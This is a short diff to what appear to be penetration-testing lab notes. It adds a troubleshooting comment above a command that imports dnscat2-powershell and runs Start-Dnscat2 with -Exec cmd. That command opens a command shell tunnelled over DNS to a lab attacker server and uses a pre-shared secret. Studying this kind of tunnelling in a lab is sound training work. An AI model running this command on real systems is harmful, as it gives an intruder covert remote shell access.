@@ -214,6 +214,7 @@ git clone https://github.com/lukebaggett/dnscat2-powershell.git
 
 Import-Module .\dnscat2.ps1
 
+# if not work, check key mentioned above
 Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd
 ```
 
